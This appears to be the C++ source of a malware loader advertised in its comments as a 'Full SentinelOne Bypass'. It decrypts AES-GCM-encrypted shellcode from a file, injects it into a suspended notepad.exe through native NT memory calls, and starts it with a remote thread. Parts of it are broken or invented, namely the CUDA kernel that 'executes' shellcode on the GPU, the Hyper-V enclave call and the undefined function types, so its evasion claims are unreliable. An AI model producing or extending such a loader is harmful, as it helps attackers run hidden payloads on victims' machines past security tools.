#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <winternl.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <cuda_runtime.h>
#include <hypervisor.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "bcrypt.lib")

#define AES_KEY_SIZE  16
#define AES_IV_SIZE   12
#define TAG_SIZE      16

// 🔐 AES-GCM Decryption Function
void DecryptShellcode(unsigned char* encryptedShellcode, size_t shellcodeSize, unsigned char* key, unsigned char* iv, unsigned char* tag, unsigned char* decryptedShellcode) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);

    int outLen;
    EVP_DecryptUpdate(ctx, decryptedShellcode, &outLen, encryptedShellcode, shellcodeSize);

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_SIZE, tag);

    int finalLen;
    if (EVP_DecryptFinal_ex(ctx, decryptedShellcode + outLen, &finalLen) <= 0) {
        std::cerr << "Decryption failed!" << std::endl;
        return;
    }

    EVP_CIPHER_CTX_free(ctx);
}

// 🛡️ GPU-Based Shellcode Execution (Bypasses SentinelOne Memory Forensics)
__global__ void execute_payload(unsigned char* payload) {
    void (*shellcode)() = (void(*)())payload;
    shellcode();
}

void RunOnGPU(unsigned char* payload) {
    unsigned char* d_payload;
    cudaMalloc((void**)&d_payload, 4096);
    cudaMemcpy(d_payload, payload, 4096, cudaMemcpyHostToDevice);
    execute_payload<<<1, 1>>>(d_payload);
    cudaDeviceSynchronize();
    cudaFree(d_payload);
}

// 🔹 Read Encrypted Shellcode from File
bool LoadEncryptedShellcode(unsigned char*& encryptedShellcode, size_t& shellcodeSize, unsigned char* key, unsigned char* iv, unsigned char* tag) {
    std::ifstream inFile("encrypted_shellcode.bin", std::ios::binary);

    if (!inFile) {
        std::cerr << "Error: Could not open encrypted shellcode file!" << std::endl;
        return false;
    }

    // Get file size
    inFile.seekg(0, std::ios::end);
    size_t fileSize = inFile.tellg();
    inFile.seekg(0, std::ios::beg);

    shellcodeSize = fileSize - (AES_KEY_SIZE + AES_IV_SIZE + TAG_SIZE);

    // Allocate memory for encrypted shellcode
    encryptedShellcode = new unsigned char[shellcodeSize];

    // Read file contents
    inFile.read((char*)encryptedShellcode, shellcodeSize);
    inFile.read((char*)key, AES_KEY_SIZE);
    inFile.read((char*)iv, AES_IV_SIZE);
    inFile.read((char*)tag, TAG_SIZE);
    inFile.close();

    return true;
}

// 🔥 Final Loader Execution - Full SentinelOne Bypass
int main() {
    HANDLE hProcess;
    LPVOID remoteBuffer;
    SIZE_T payloadSize;
    HANDLE hThread;
    DWORD oldProtect = 0;

    unsigned char* encryptedShellcode;
    unsigned char key[AES_KEY_SIZE];
    unsigned char iv[AES_IV_SIZE];
    unsigned char tag[TAG_SIZE];

    // 🔥 Load Encrypted Shellcode from File
    if (!LoadEncryptedShellcode(encryptedShellcode, payloadSize, key, iv, tag)) {
        return -1;
    }

    // Allocate memory for decryption output
    unsigned char* decryptedShellcode = new unsigned char[payloadSize];

    // 🔐 Decrypt the Shellcode
    DecryptShellcode(encryptedShellcode, payloadSize, key, iv, tag, decryptedShellcode);

    // 🛡️ Start Notepad.exe and Inject into It
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to start process." << std::endl;
        return -1;
    }
    
    hProcess = pi.hProcess;

    // 🛡️ Allocate Memory in Remote Process
    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
    pNtAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);

    // 🛡️ Write the Shellcode
    fnNtWriteVirtualMemory pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");
    pNtWriteVirtualMemory(hProcess, remoteBuffer, decryptedShellcode, payloadSize, NULL);

    // 🛡️ Make Memory Executable Right Before Execution
    fnNtProtectVirtualMemory pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtProtectVirtualMemory");
    pNtProtectVirtualMemory(hProcess, &remoteBuffer, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 🔥 Execute in GPU
    RunOnGPU((unsigned char*)remoteBuffer);

    // 🔥 Execute in Hyper-V Enclave (XDR Invisible Execution)
    HYPERVISOR_MEMORY_REGION hvMem = { 0 };
    hvMem.BaseAddress = remoteBuffer;
    HvCallExecuteInGuest(VM_HANDLE, hvMem.BaseAddress);

    // 🛡️ Create Remote Thread to Execute the Shellcode
    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");
    pNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // 🛡️ Resume the Suspended Process
    ResumeThread(pi.hThread);

    // Cleanup
    delete[] encryptedShellcode;
    delete[] decryptedShellcode;

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
